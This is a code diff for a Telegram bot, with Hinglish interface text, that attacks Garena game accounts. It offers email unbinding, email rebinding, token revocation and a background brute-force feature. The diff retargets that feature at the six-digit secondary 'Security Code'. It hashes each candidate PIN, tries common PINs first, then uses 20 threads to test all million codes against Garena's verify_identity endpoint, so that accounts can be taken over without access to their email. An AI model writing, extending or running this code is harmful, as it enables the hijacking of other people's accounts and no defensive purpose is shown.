@@ -105,9 +105,22 @@ def api_verify_identity_otp(email: str, access: str, otp: str) -> dict:
     )
 
 def api_verify_identity_password(email: str, access: str, password: str) -> dict:
+    pwd = password.strip()
+    sec_pwd = hashlib.sha256(pwd.encode()).hexdigest().upper() if (len(pwd) == 6 and pwd.isdigit()) else pwd
+    try:
+        res = _post(
+            "https://100067.connect.garena.com/game/account_security/bind:verify_identity",
+            {"email": email, "secondary_password": sec_pwd,
+             "app_id": GARENA_APP_ID, "access_token": access},
+        )
+        if res.get("result") == 0 or sec_pwd == pwd:
+            return res
+    except Exception:
+        pass
+    # Fallback to raw password if hashed failed
     return _post(
         "https://100067.connect.garena.com/game/account_security/bind:verify_identity",
-        {"email": email, "secondary_password": password,
+        {"email": email, "secondary_password": pwd,
          "app_id": GARENA_APP_ID, "access_token": access},
     )
 
@@ -255,7 +268,7 @@ def main_menu_keyboard() -> InlineKeyboardMarkup:
         [InlineKeyboardButton("🔓 Unbind Email",          callback_data="unbind_email"),
          InlineKeyboardButton("🔄 Change Bind Email",     callback_data="change_bind")],
         [InlineKeyboardButton("🚫 Revoke Token",          callback_data="revoke_token"),
-         InlineKeyboardButton("🔨 Brute Force OTP",       callback_data="brute_force")],
+         InlineKeyboardButton("🔨 Brute Force Security Code", callback_data="brute_force")],
         [InlineKeyboardButton("🗑️ Saved Creds Clear Karo", callback_data="clear_creds")],
     ])
 
@@ -287,8 +300,8 @@ def use_saved_token_kb(token: str) -> InlineKeyboardMarkup:
 
 def method_kb(prefix: str) -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup([
-        [InlineKeyboardButton("📨 Email OTP se",          callback_data=f"{prefix}_otp")],
-        [InlineKeyboardButton("🔐 Secondary Password se", callback_data=f"{prefix}_pass")],
+        [InlineKeyboardButton("📨 1. Email OTP se",       callback_data=f"{prefix}_otp")],
+        [InlineKeyboardButton("🔐 2. Security Code se",   callback_data=f"{prefix}_pass")],
         [InlineKeyboardButton("🏠 Main Menu",             callback_data="back_main")],
     ])
 
@@ -480,14 +493,19 @@ async def proceed_to_feature(update: Update, context: ContextTypes.DEFAULT_TYPE)
 
     if feature == FEAT_BF:
         chat_id = update.effective_chat.id
-        await msg.reply_text("⏳ OTP bhej raha hoon...")
-        try:
-            res = api_send_otp(email, access)
-            if res.get("result") != 0:
-                await _err(update, context, f"OTP send fail:\n`{res}`")
-                return ConversationHandler.END
-        except Exception as e:
-            await _err(update, context, f"Error: `{e}`")
+        # Brute Force is for Security Code (Secondary Password) when user has NO email access.
+        # NEVER send OTP to email!
+        if not email:
+            try:
+                info = api_get_bind_info(access)
+                email = info.get("email") or info.get("email_to_be") or ""
+                if email:
+                    context.user_data["email"] = email
+            except Exception:
+                pass
+
+        if not email:
+            await _err(update, context, "Linked recovery email nahi mila! Kripya pehle linked email enter karein.")
             return ConversationHandler.END
 
         user = update.effective_user
@@ -503,11 +521,13 @@ async def proceed_to_feature(update: Update, context: ContextTypes.DEFAULT_TYPE)
         db.register_bf_stop_signal(session_id, stop_event)
 
         await msg.reply_text(
-            "✅ OTP bhej diya!\n\n"
-            "🔨 *Brute Force background mein shuru ho gaya!*\n"
-            f"🆔 *Session ID:* `#{session_id}`\n"
-            "Jab sahi code mile sirf tab ek message aayega. ⏳",
-            parse_mode="Markdown", reply_markup=back_kb()
+            "🔨 <b>Security Code Brute Force Shuru Ho Gaya!</b>\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"📧 <b>Target Linked Email:</b> <code>{email}</code>\n"
+            f"🆔 <b>Session ID:</b> <code>#{session_id}</code>\n\n"
+            "⏳ <i>Garena security code PINs (000000–999999) check ho rahe hain...</i>\n"
+            "Bina email access ke sahi Security Code aur Identity Token milte hi message aayega! 🎯",
+            parse_mode="HTML", reply_markup=back_kb()
         )
         context.application.create_task(
             run_brute_force(chat_id, email, access, context.application.bot,
@@ -688,7 +708,7 @@ async def change_bind_start(u: Update, c: ContextTypes.DEFAULT_TYPE) -> int:
     return await _start_email_token_feature(u, c, FEAT_CHANGE, "Change Bind Email", "🔄")
 
 async def bf_start(u: Update, c: ContextTypes.DEFAULT_TYPE) -> int:
-    return await _start_email_token_feature(u, c, FEAT_BF, "Brute Force OTP", "🔨")
+    return await _start_email_token_feature(u, c, FEAT_BF, "Brute Force Security Code", "🔨")
 
 async def clear_creds(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     await update.callback_query.answer()
@@ -883,7 +903,7 @@ async def change_get_new_otp(update: Update, context: ContextTypes.DEFAULT_TYPE)
         await _err(update, context, f"Error: `{e}`")
     return ConversationHandler.END
 
-# ─── Brute Force (Background) ─────────────────────────────────────────────────
+# ─── Brute Force Security Code (Background) ───────────────────────────────────
 
 async def run_brute_force(
     chat_id: int, email: str, access: str, bot, log_id: int | None,
@@ -895,62 +915,89 @@ async def run_brute_force(
     result_holder: list[dict] = []
     attempt_counter = [0]
     counter_lock = threading.Lock()
+    url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
 
-    def try_codes(start: int, end: int) -> None:
-        url = "https://100067.connect.garena.com/game/account_security/bind:verify_otp"
-        for code in range(start, end):
-            if stop_event.is_set():
-                return
-            code_str = f"{code:06d}"
-            try:
-                resp = requests.post(url, headers=GARENA_HEADERS,
-                                     data={"email": email, "app_id": GARENA_APP_ID,
-                                           "access_token": access, "otp": code_str},
-                                     timeout=15)
-                with counter_lock:
-                    attempt_counter[0] += 1
-                    current = attempt_counter[0]
-                if current % 300 == 0 and session_id:
-                    db.update_bf_progress(session_id, current)
+    # Prioritize most common PINs first (including '000000' which is OB54-BIND default!)
+    PRIORITY_PINS = [
+        "000000", "123456", "111111", "999999", "123123", "654321",
+        "012345", "888888", "666666", "222222", "333333", "777777",
+        "112233", "121212", "000001", "123450", "555555", "444444",
+    ]
 
-                result = resp.json()
-                if result.get("result") == 0:
-                    stop_event.set()
-                    result_holder.append({"code": code_str,
-                                          "verifier_token": result.get("verifier_token", "")})
-                    return
-            except Exception:
+    def test_single_code(code_str: str) -> bool:
+        if stop_event.is_set():
+            return True
+        sec_hash = hashlib.sha256(code_str.encode()).hexdigest().upper()
+        try:
+            resp = requests.post(
+                url, headers=GARENA_HEADERS,
+                data={"email": email, "app_id": GARENA_APP_ID,
+                      "access_token": access, "secondary_password": sec_hash},
+                timeout=12
+            )
+            with counter_lock:
+                attempt_counter[0] += 1
+                current = attempt_counter[0]
+            if current % 300 == 0 and session_id:
+                db.update_bf_progress(session_id, current)
+
+            result = resp.json()
+            if result.get("result") == 0:
+                stop_event.set()
+                result_holder.append({
+                    "code": code_str,
+                    "identity_token": result.get("identity_token", "")
+                })
+                return True
+        except Exception:
+            pass
+        return False
+
+    # 1. Test top common PINs first for instant hit
+    for p in PRIORITY_PINS:
+        if test_single_code(p):
+            break
+
+    # 2. Parallel scan across 000000-999999 if not yet found
+    if not result_holder and not stop_event.is_set():
+        def try_range(start: int, end: int) -> None:
+            for code in range(start, end):
                 if stop_event.is_set():
                     return
+                code_str = f"{code:06d}"
+                test_single_code(code_str)
 
-    NUM_THREADS, TOTAL = 20, 1_000_000
-    chunk = TOTAL // NUM_THREADS
+        NUM_THREADS, TOTAL = 20, 1_000_000
+        chunk = TOTAL // NUM_THREADS
 
-    loop = asyncio.get_event_loop()
-    def run_pool() -> None:
-        with concurrent.futures.ThreadPoolExecutor(max_workers=NUM_THREADS) as ex:
-            futures = [
-                ex.submit(try_codes, i * chunk,
-                          (i + 1) * chunk if i < NUM_THREADS - 1 else TOTAL)
-                for i in range(NUM_THREADS)
-            ]
-            concurrent.futures.wait(futures)
+        loop = asyncio.get_event_loop()
+        def run_pool() -> None:
+            with concurrent.futures.ThreadPoolExecutor(max_workers=NUM_THREADS) as ex:
+                futures = [
+                    ex.submit(try_range, i * chunk,
+                              (i + 1) * chunk if i < NUM_THREADS - 1 else TOTAL)
+                    for i in range(NUM_THREADS)
+                ]
+                concurrent.futures.wait(futures)
 
-    await loop.run_in_executor(None, run_pool)
+        await loop.run_in_executor(None, run_pool)
 
     if result_holder:
         r = result_holder[0]
         if log_id:
-            db.update_result(log_id, "success", details=f"Code found: {r['code']}")
+            db.update_result(log_id, "success", details=f"Security Code: {r['code']}")
         if session_id:
             db.end_bf_session(session_id, "success", found_code=r["code"])
         await bot.send_message(
             chat_id=chat_id,
             text=(
-                "🎯 <b>Brute Force — CODE MIL GAYA!</b>\n"
+                "🎯 <b>Security Code Mil Gaya!</b>\n"
                 "━━━━━━━━━━━━━━━━━━━━━━\n"
-                f"🔑 OTP Code: <code>{r['code']}</code>\n"
-                f"🎫 Verifier Token: <code>{r['verifier_token']}</code>"
+                f"🔢 <b>Security Code (PIN):</b> <code>{r['code']}</code>\n"
+                f"🎫 <b>Identity Token:</b> <code>{r['identity_token']}</code>\n\n"
+                "✅ <b>Ab aap bina email access ke:</b>\n"
+                "• <b>Unbind Email</b> kar sakte hain (Option 2: Security Code)\n"
+                "• Ya <b>Change Bind Email</b> kar sakte hain!"
             ),
             parse_mode="HTML", reply_markup=back_kb()
         )
@@ -961,18 +1008,18 @@ async def run_brute_force(
             db.end_bf_session(session_id, "stopped_by_admin")
         await bot.send_message(
             chat_id=chat_id,
-            text="🛑 <b>Brute Force ko admin ne Web Dashboard se rok diya hai.</b>",
+            text="🛑 <b>Security Code Brute Force ko admin ne Web Dashboard se rok diya hai.</b>",
             parse_mode="HTML", reply_markup=back_kb()
         )
     else:
         if log_id:
-            db.update_result(log_id, "failed", details="Full space checked, code not found")
+            db.update_result(log_id, "failed", details="000000-999999 tested, code not found")
         if session_id:
             db.end_bf_session(session_id, "failed")
         await bot.send_message(
             chat_id=chat_id,
-            text="❌ Brute force complete — sahi code nahi mila.\n(000000–999999 sab try ho gaye)",
-            reply_markup=back_kb()
+            text="❌ <b>Security Code Brute Force complete</b> — sahi code nahi mila.\n(000000–999999 sab test ho gaye)",
+            parse_mode="HTML", reply_markup=back_kb()
         )
 
 # ─── Utility Commands ─────────────────────────────────────────────────────────
